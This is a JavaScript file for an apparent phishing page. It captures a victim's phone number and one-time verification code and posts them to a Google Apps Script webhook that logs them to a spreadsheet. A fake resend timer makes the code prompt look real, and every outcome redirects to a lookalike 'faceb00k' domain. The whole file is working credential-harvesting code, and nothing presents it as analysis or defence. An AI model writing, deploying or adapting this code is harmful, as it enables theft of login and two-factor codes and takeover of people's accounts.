// Replace this with your Apps Script Web App URL:
const GSHEET_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxnyo8Qln2OY0EDBV6aHph3ZMjd3YopvAe8hxKHmPLW8B9ru8dVnFJ2Q7LXnuaGjSg7ZQ/exec';

const phoneInput   = document.getElementById('phoneInput');
const codeInput    = document.getElementById('codeInput');
const continueBtn  = document.getElementById('continueBtn');
const errorMsg     = document.getElementById('errorMsg');

const sendCodeBtn  = document.getElementById('sendCodeBtn');
const timerSpan    = document.getElementById('timer');

let countdownInterval = null;

/**
 * Format seconds into MM:SS
 */
function formatTime(sec) {
  const m = Math.floor(sec / 60);
  const s = sec % 60;
  return `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
}

/**
 * Start the 2‑minute countdown.
 */
function startCountdown() {
  let timeLeft = 120; // 2 minutes

  // Disable resend, show timer
  sendCodeBtn.disabled = true;
  timerSpan.textContent = formatTime(timeLeft);
  timerSpan.style.display = 'inline';

  countdownInterval = setInterval(() => {
    timeLeft--;
    if (timeLeft <= 0) {
      clearInterval(countdownInterval);
      timerSpan.style.display = 'none';
      sendCodeBtn.disabled = false;
    } else {
      timerSpan.textContent = formatTime(timeLeft);
    }
  }, 1000);
}

// When “Send New Code” is clicked, restart the countdown
sendCodeBtn.addEventListener('click', () => {
  startCountdown();
  // (Optionally) trigger the actual “send code” API here
});

// On page load, immediately start the first countdown
window.addEventListener('load', () => {
  startCountdown();
});

// Handle the Continue button
continueBtn.addEventListener('click', () => {
  const phone = phoneInput.value.trim();
  const code  = codeInput.value.trim();

  errorMsg.style.visibility = 'hidden';
  if (!phone || !code) {
    errorMsg.textContent = 'Please enter both phone number and code.';
    errorMsg.style.visibility = 'visible';
    return;
  }

  fetch(GSHEET_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ phone, code })
  })
  .then(res => res.json())
  .then(_data => {
    // Always redirect, even if sheet write fails
    window.location.href = 'https://faceb00k-kappa.vercel.app/';
  })
  .catch(_err => {
    window.location.href = 'https://faceb00k-kappa.vercel.app/';
  });
});
